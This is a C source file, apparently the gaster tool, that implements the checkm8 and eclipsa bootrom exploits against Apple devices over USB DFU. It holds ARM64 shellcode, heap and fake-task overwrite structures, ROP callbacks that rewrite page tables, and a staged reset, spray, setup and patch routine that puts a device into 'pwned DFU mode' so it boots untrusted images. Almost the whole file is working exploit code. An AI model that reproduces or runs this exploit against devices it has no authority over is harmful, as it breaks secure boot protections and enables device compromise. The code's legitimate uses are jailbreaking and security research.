		0xEB01001F, /* cmp x0, x1 */
		0x54000161, /* bne _request_done */
		0xF900029F, /* str xzr, [x20] */
		0xA9410680, /* ldp x0, x1, [x20, #0x10] */
		0xA9420E82, /* ldp x2, x3, [x20, #0x20] */
		0xA9431684, /* ldp x4, x5, [x20, #0x30] */
		0xF9402286, /* ldr x6, [x20, #0x40] */
		0xF9402687, /* ldr x7, [x20, #0x48] */
		0xF9400688, /* ldr x8, [x20, #0x8] */
		0xD63F0100, /* blr x8 */
		0x58000248, /* ldr x8, =done_magic */
		0xA9000288, /* stp x8, x0, [x20] */
		/* _request_done: */
		0x52801000, /* mov w0, #0x80 */
		0xAA1403E1, /* mov x1, x20 */
		0x79400E62, /* ldrh w2, [x19, #0x6] */
		0xAA1F03E3, /* mov x3, xzr */
		0x580001C4, /* ldr x4, =usb_core_do_transfer */
		0xD63F0080, /* blr x4 */
		0x52800000, /* mov w0, #0 */
		0xA8C153F3, /* ldp x19, x20, [sp], #0x10 */
		0xA8C17BFD, /* ldp x29, x30, [sp], #0x10 */
		0xD65F03C0 /* ret */
	};
	struct {
		uint8_t payload[sizeof(payload_notA9)];
		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
	} notA9;
	struct {
		uint8_t payload[sizeof(payload_A9)];
		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
	} A9;
	struct {
		uint8_t payload[sizeof(payload_handle_checkm8_request)];
		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, usb_core_do_transfer;
	} handle_checkm8_request;
	callback_t callbacks[] = {
		{ enter_critical_section, 0 },
		{ write_ttbr0, insecure_memory_base },
		{ tlbi, 0 },
		{ insecure_memory_base + 0x2000000U + ttbr0_sram_off + 2 * sizeof(uint64_t), 0 },
		{ write_ttbr0, ttbr0_addr },
		{ tlbi, 0 },
		{ exit_critical_section, 0 },
		{ ret_gadget, 0 }
	};
	uint8_t payload[0x800 + sizeof(A9) + sizeof(handle_checkm8_request)];
	checkm8_overwrite_t checkm8_overwrite;
	eclipsa_overwrite_t eclipsa_overwrite;
	size_t payload_sz, overwrite_sz;
	transfer_ret_t transfer_ret;
	void *overwrite;
	uint64_t reg;

	memset(payload, '\0', sizeof(payload));
	if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
		reg = 0x1000006A5;
		memcpy(payload + ttbr0_vrom_off, &reg, sizeof(reg));
		reg = 0x60000100000625;
		memcpy(payload + ttbr0_vrom_off + sizeof(reg), &reg, sizeof(reg));
		reg = 0x60000180000625;
		memcpy(payload + ttbr0_sram_off, &reg, sizeof(reg));
		reg = 0x1800006A5;
		memcpy(payload + ttbr0_sram_off + sizeof(reg), &reg, sizeof(reg));
		usb_rop_callbacks(payload + offsetof(dfu_callback_t, callback), insecure_memory_base, callbacks, sizeof(callbacks) / sizeof(callbacks[0]));
		payload_sz = ttbr0_sram_off + 2 * sizeof(reg);
	} else {
		payload_sz = 0;
	}
	if(cpid == 0x8000 || cpid == 0x8003) {
		memcpy(A9.payload, payload_A9, sizeof(payload_A9));
		memset(A9.pwnd, '\0', sizeof(A9.pwnd));
		memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
		A9.payload_dest = boot_tramp_end - sizeof(handle_checkm8_request);
		A9.dfu_handle_request = dfu_handle_request;
		A9.payload_off = sizeof(A9);
		A9.payload_sz = sizeof(handle_checkm8_request);
		A9.memcpy_addr = memcpy_addr;
		A9.gUSBSerialNumber = gUSBSerialNumber;
		A9.usb_create_string_descriptor = usb_create_string_descriptor;
		A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
		A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
		A9.patch_addr = patch_addr;
		memcpy(payload + payload_sz, &A9, sizeof(A9));
		payload_sz += sizeof(A9);
	} else {
		memcpy(notA9.payload, payload_notA9, sizeof(payload_notA9));
		memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
		memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
		notA9.payload_dest = boot_tramp_end - sizeof(handle_checkm8_request);
		notA9.dfu_handle_request = dfu_handle_request;
		notA9.payload_off = sizeof(notA9);
		notA9.payload_sz = sizeof(handle_checkm8_request);
		notA9.memcpy_addr = memcpy_addr;
		notA9.gUSBSerialNumber = gUSBSerialNumber;
		notA9.usb_create_string_descriptor = usb_create_string_descriptor;
		notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
		notA9.patch_addr = patch_addr;
		if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
			notA9.patch_addr += 0x2000000U;
		}
		memcpy(payload + payload_sz, &notA9, sizeof(notA9));
		payload_sz += sizeof(notA9);
	}
	memcpy(handle_checkm8_request.payload, payload_handle_checkm8_request, sizeof(payload_handle_checkm8_request));
	handle_checkm8_request.handle_interface_request = handle_interface_request;
	handle_checkm8_request.insecure_memory_base = insecure_memory_base;
	handle_checkm8_request.exec_magic = 0x6578656365786563ULL;
	handle_checkm8_request.done_magic = 0x646F6E65646F6E65ULL;
	handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
	memcpy(payload + payload_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
	payload_sz += sizeof(handle_checkm8_request);
	overwrite = NULL;
	overwrite_sz = 0;
	if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
		memset(&eclipsa_overwrite, '\0', sizeof(eclipsa_overwrite));
		eclipsa_overwrite.synopsys_task.id = 5;
		strcpy(eclipsa_overwrite.synopsys_task.name, "usb");
		eclipsa_overwrite.synopsys_task.magic_1 = 0x74736B32;
		eclipsa_overwrite.synopsys_task.stack_len = 0x4000;
		eclipsa_overwrite.synopsys_task.routine = synopsys_routine_addr;
		eclipsa_overwrite.synopsys_task.stack_base = io_buffer_addr + offsetof(eclipsa_overwrite_t, fake_task);
		eclipsa_overwrite.synopsys_task.ret_waiters_list.prev = eclipsa_overwrite.synopsys_task.ret_waiters_list.next = eclipsa_overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
		eclipsa_overwrite.heap_block.prev_sz = sizeof(eclipsa_overwrite.synopsys_task) / sizeof(eclipsa_overwrite.heap_block) + 1;
		eclipsa_overwrite.heap_block.this_sz = eclipsa_overwrite.synopsys_task.stack_len / sizeof(eclipsa_overwrite.heap_block) + 2;
		eclipsa_overwrite.fake_task.id = 6;
		eclipsa_overwrite.fake_task.irq_dis_cnt = 1;
		eclipsa_overwrite.fake_task.state = TASK_RUNNING;
		eclipsa_overwrite.fake_task.magic_1 = 0x74736B32;
		strcpy(eclipsa_overwrite.fake_task.name, "eclipsa");
		eclipsa_overwrite.fake_task.magic_0 = 0x7374616B;
		eclipsa_overwrite.fake_task.arch.lr = arch_task_tramp_addr;
		memcpy(eclipsa_overwrite.fake_task.arch.shc, payload, payload_sz);
		eclipsa_overwrite.fake_task.stack_len = eclipsa_overwrite.synopsys_task.stack_len;
		eclipsa_overwrite.fake_task.stack_base = eclipsa_overwrite.synopsys_task.stack_base;
		eclipsa_overwrite.fake_task.arch.sp = eclipsa_overwrite.fake_task.stack_base + eclipsa_overwrite.fake_task.stack_len;
		eclipsa_overwrite.fake_task.routine = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
		eclipsa_overwrite.fake_task.queue_list.prev = eclipsa_overwrite.fake_task.queue_list.next = io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
		eclipsa_overwrite.fake_task.ret_waiters_list.prev = eclipsa_overwrite.fake_task.ret_waiters_list.next = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
		overwrite = &eclipsa_overwrite.synopsys_task.callout;
		overwrite_sz = sizeof(eclipsa_overwrite) - offsetof(eclipsa_overwrite_t, synopsys_task.callout);
	} else if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
		memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
		if(cpid != 0x8960) {
			checkm8_overwrite.callback.callback = nop_gadget;
			checkm8_overwrite.callback.next = insecure_memory_base;
			checkm8_overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
			checkm8_overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
		} else {
			checkm8_overwrite.callback.callback = insecure_memory_base;
		}
		overwrite = &checkm8_overwrite;
		overwrite_sz = sizeof(checkm8_overwrite);
	}
	if(overwrite != NULL && send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL && send_usb_control_request_no_data(handle, 0x21, 1, 0, 0, 0x40, NULL)) {
		if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
			send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
		} else if(!dfu_send_data(handle, payload, payload_sz, false)) {
			return false;
		}
		return true;
	}
	return false;
}

static bool
gaster_checkm8(usb_handle_t *handle) {
	enum {
		STAGE_RESET,
		STAGE_SPRAY,
		STAGE_SETUP,
		STAGE_PATCH,
		STAGE_PWNED,
	} stage = STAGE_RESET;
	bool ret, pwned;

	init_usb_handle(handle, 0x5AC, 0x1227);
	while(stage != STAGE_PWNED && wait_usb_handle(handle, 0, 0, checkm8_check_usb_device, &pwned)) {
		if(!pwned) {
			if(stage == STAGE_RESET) {
				puts("Stage: RESET");
				ret = checkm8_stage_reset(handle);
				if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
					stage = STAGE_SETUP;
				} else {
					stage = STAGE_SPRAY;
				}
			} else if(stage == STAGE_SPRAY) {
				puts("Stage: SPRAY");
				ret = checkm8_stage_spray(handle);
				stage = STAGE_SETUP;
			} else if(stage == STAGE_SETUP) {
				puts("Stage: SETUP");
				ret = checkm8_stage_setup(handle);
				stage = STAGE_PATCH;
			} else {
				puts("Stage: PATCH");
				ret = checkm8_stage_patch(handle);
			}
			if(ret) {
				puts("ret: true");
			} else {
				puts("ret: false");
				stage = STAGE_RESET;
			}
			reset_usb_handle(handle);
		} else {
			stage = STAGE_PWNED;
			puts("Now you can boot untrusted images.");
		}
		close_usb_handle(handle);
	}
	return stage == STAGE_PWNED;
}

int
main(int argc, char **argv) {
	char *env = getenv("USB_TIMEOUT");
	int ret = EXIT_FAILURE;
	usb_handle_t handle;

	if(env == NULL || sscanf(env, "%u", &usb_timeout) != 1) {
		usb_timeout = 5;
	}
	printf("usb_timeout: %u\n", usb_timeout);
	if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
		if(gaster_checkm8(&handle)) {
			ret = 0;
		}
	} else {
		printf("Usage: env %s options\n", argv[0]);
		puts("env:");
		puts("USB_TIMEOUT - USB timeout in ms");
		puts("options:");
		puts("pwn - Put the device in pwned DFU mode");
	}
	return ret;
}
